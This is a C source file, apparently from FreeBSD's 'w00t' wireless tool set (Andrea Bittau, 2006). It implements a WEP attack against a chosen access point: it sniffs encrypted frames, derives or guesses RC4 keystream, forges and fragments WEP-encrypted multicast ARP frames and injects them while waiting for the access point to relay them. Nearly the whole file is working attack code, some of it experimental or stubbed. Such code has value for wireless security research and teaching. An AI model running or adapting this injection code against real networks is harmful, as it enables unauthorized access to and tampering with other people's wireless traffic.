/*-
 * Copyright (c) 2006, Andrea Bittau <a.bittau@cs.ucl.ac.uk>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * $FreeBSD$
 */
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <assert.h>
#include <zlib.h>
#include "w00t.h"

enum {
	S_START = 0,
	S_WAIT_RELAY,
};

struct queue {
	struct ieee80211_frame *wh;
	int len;

	char *buf;
	int live;
	struct queue *next;
};

struct params {
	int rx;
	int tx;

	int tap;

	char mcast[5];
	char mac[6];
	char ap[6];

	char prga[2048];
	int prga_len;

	int state;

	struct queue *q;

	char packet[2048];
	int packet_len;
	struct timeval last;

	int seq;

	unsigned char guess;
};

int wanted(struct params *p, struct ieee80211_frame *wh, int len)
{
	char *bssid, *sa;

	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
		bssid = wh->i_addr1;
		sa = wh->i_addr2;
	}	
	else {
		bssid = wh->i_addr2;
		sa = wh->i_addr3;
	}	

	if (memcmp(bssid, p->ap, 6) != 0)
		return 0;

	if (!(wh->i_fc[1] & IEEE80211_FC1_PROTECTED)) {
		printf("Got non WEP packet...\n");
		return 0;
	}

	/* my own shit */
	if (memcmp(p->mac, sa, 6) == 0)
		return 0;

	return 1;	
}

void enque(struct params *p, char **buf, struct ieee80211_frame *wh, int len)
{
	struct queue *q = p->q;
	int qlen = 0;
	char *ret = NULL;
	struct queue *last = NULL;

	/* find a slot */
	while (q) {
		if (q->live)
			qlen++;
		else {
			/* recycle */
			ret = q->buf;
			break;
		}

		last = q;
		q = q->next;	
	}

	/* need to create slot */
	if (!q) {
		q = (struct queue*) malloc(sizeof(*q));
		if (!q)
			err(1, "malloc()");
		memset(q, 0, sizeof(*q));
	
		/* insert */
		if (!p->q)
			p->q = q;
		else {
			assert(last);
			last->next = q;
		}
	}

	q->live = 1;
	q->buf = *buf;
	q->len = len;
	q->wh = wh;

	qlen++;

	if (qlen > 5)
		printf("Enque.  Size: %d\n", qlen);
	*buf = ret;
}

void send_packet(struct params *p)
{       
        int rc;

        rc = inject(p->tx, p->packet, p->packet_len);
        if (rc == -1)
                err(1, "inject()");
        if (rc != p->packet_len) {
                printf("Wrote %d/%d\n", rc, p->packet_len);
                exit(1);
        }
        
        if (gettimeofday(&p->last, NULL) == -1)
                err(1, "gettimeofday()");
}
#include <openssl/rc4.h>
void send_mcast(struct params *p, unsigned char x)
{
	struct ieee80211_frame *wh;
	short *seq;
	struct queue *q = p->q;
	char *data, *ptr;
	int len;
	uLong crc = crc32(0L, Z_NULL, 0);
	uLong *pcrc;
	int i;
	int need_frag = 0;
	char payload[10] = "\xAA\xAA\x03\x00\x00\x00\x08\x06\x00\x00";

	assert(q);

	/* 802.11 */
	memset(p->packet, 0, sizeof(p->packet));
	wh = (struct ieee80211_frame*) p->packet;
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
	
	wh->i_dur[0] = 0x69;
	
	memcpy(wh->i_addr1, p->ap, 6);
	memcpy(wh->i_addr2, p->mac, 6);
	memcpy(wh->i_addr3, p->mcast, 5);
	wh->i_addr3[5] = x;

	seq = (short*) wh->i_seq;
	*seq = seqfn(p->seq++, 0);

	/* IV */
	data = (char*) (wh+1);
	ptr = (char*) (q->wh+1);
	memcpy(data, ptr, 3);

	if (p->prga_len == 0) {
	
		RC4_KEY k;
		unsigned char key[8];

		memset(&key[3], 0x61, 5);
		memcpy(key, (q->wh+1), 3);
		p->prga_len = 128;

		RC4_set_key(&k, 8, key);
		memset(p->prga, 0, sizeof(p->prga));
		RC4(&k, p->prga_len, p->prga, p->prga);

		
#if 0	
		int ptl = q->len;
		char *pt;

		pt = known_pt(q->wh, &ptl);
		ptr += 4;
		p->prga_len = ptl;
		for (i = 0; i < p->prga_len; i++)
			p->prga[i] = ptr[i] ^ pt[i];
#endif			
	}

	/* data */
	data += 4;
	memcpy(data, payload, sizeof(payload));
	p->prga_len = 12;
	len = p->prga_len + 1 - 4;

#if 1
	if (len < sizeof(payload)) {
		need_frag = len;
		wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;
	}	
#endif

	/* crc */
	pcrc = (uLong*) (data+len);
	*pcrc = crc32(crc, data, len);

	/* wepify */
	len += 4;
	for (i = 0; i < (len); i++) {
		assert( i <= p->prga_len);
		data[i] ^= p->prga[i];
	}
//	data[i] ^= x;

	len += sizeof(*wh);
	p->packet_len = len + 4;
	send_packet(p);

	/* the data we sent is too fucking short */
	if (need_frag) {
		memset(data, 0, len);

		/* 802.11 */
		*seq = seqfn(p->seq-1, 1);
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;

		/* data */
		len = sizeof(payload) - need_frag;
		assert(len > 0 && len <= (p->prga_len - 4));
		memcpy(data, &payload[need_frag], len);
	
		/* crc */
		crc = crc32(0L, Z_NULL, 0);
		len = p->prga_len - 4;
		pcrc = (uLong*) (data+len);
		*pcrc = crc32(crc, data, len);

		/* wepify */
		len += 4;
		for (i = 0; i < len; i++) {
			assert( i < p->prga_len);
			data[i] ^= p->prga[i];
		}

		len += sizeof(*wh) + 4;
		p->packet_len = len;
		send_packet(p);
	}
}

void send_queue(struct params *p)
{
	struct queue *q = p->q;
	int i;
	
	assert(q);
	assert(q->live);

	for (i = 0; i < 5; i++) {
		send_mcast(p, p->guess++);
	}
	
	p->state = S_WAIT_RELAY;
}

void got_mcast(struct params *p, struct ieee80211_frame *wh, int len)
{
	printf("ao\n");
}

void read_wifi(struct params *p)
{
	static char *buf = 0;
	static int buflen = 4096;
	struct ieee80211_frame *wh;
	int rc;

	if (!buf) {
		buf = (char*) malloc(buflen);
		if (!buf)
			err(1, "malloc()");
	}
	
	rc = sniff(p->rx, buf, buflen);
	if (rc == -1)
		err(1, "sniff()");

	wh = get_wifi(buf, &rc);
	if (!wh)
		return;

	/* relayed macast */
	if (frame_type(wh, IEEE80211_FC0_TYPE_DATA,
		       IEEE80211_FC0_SUBTYPE_DATA) &&
	    (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
	    (memcmp(wh->i_addr2, p->ap, 6) == 0) &&
	    (memcmp(wh->i_addr1, p->mcast, 5) == 0) &&
	    (memcmp(p->mac, wh->i_addr3, 6) == 0)) {
		got_mcast(p, wh, rc);
		return;
	}

	/* data */
	if (frame_type(wh, IEEE80211_FC0_TYPE_DATA,
		       IEEE80211_FC0_SUBTYPE_DATA)) {
		if (!wanted(p, wh, rc))
			return;
		
		enque(p, &buf, wh, rc);
		if (p->state == S_START)
			send_queue(p);
		return;
	}
}

void own(struct params *p)
{
	struct timeval tv;
	struct timeval *to = NULL;
	fd_set fds;
	int tout = 10*1000;

	if (p->state == S_WAIT_RELAY) {
		int el;

		/* check timeout */
		if (gettimeofday(&tv, NULL) == -1)
			err(1, "gettimeofday()");
	
		el = elapsed(&p->last, &tv);

		/* timeout */
		if (el >= tout) {
			if (p->q && p->q->live) {
				send_queue(p);
				el = 0;
			} else {
				p->state = S_START;
				return;
			}
		}
		el = tout - el;
		tv.tv_sec = el/1000/1000;
		tv.tv_usec = el - tv.tv_sec*1000*1000;
		to = &tv;
	}

	FD_ZERO(&fds);
	FD_SET(p->rx, &fds);

	if (select(p->rx+1, &fds, NULL, NULL, to) == -1)
		err(1, "select()");

	if (FD_ISSET(p->rx, &fds))
		read_wifi(p);
}

void usage(char *name)
{
	printf("Usage %s <opts>\n"
	       "-h\thelp\n"
	       "-b\t<bssid>\n"
	       "-t\t<tap>\n"
	       , name);
	exit(1);
}

int main(int argc, char *argv[])
{
	struct params p;
	char *iface = "wlan0";
	char *tap = "tap0";
	int ch;

	memset(&p, 0, sizeof(p));
	memcpy(p.mac, "\x00\x00\xde\xfa\xce\xd", 6);
	p.seq = getpid();
	memcpy(p.mcast, "\x01\x00\x5e\x00\x00", 5);

	while ((ch = getopt(argc, argv, "hb:t:")) != -1) {
		switch (ch) {
		case 't':
			tap = optarg;
			break;

		case 'b':
			if (str2mac(p.ap, optarg) == -1) {
				printf("Can't parse BSSID\n");
				exit(1);
			}
			break;

		case 'h':
		default:
			usage(argv[0]);
			break;
		}
	}

	if ((p.rx = open_rx(iface)) == -1)
		err(1, "open_rx()");
	if ((p.tx = open_tx(iface)) == -1)
		err(1, "open_tx()");

	if ((p.tap = open_tap(tap)) == -1)
		err(1, "open_tap()");
	if (set_iface_mac(tap, p.mac) == -1)
		err(1, "set_iface_mac()");

	p.state = S_START;
	while (1)
		own(&p);

	exit(0);
}
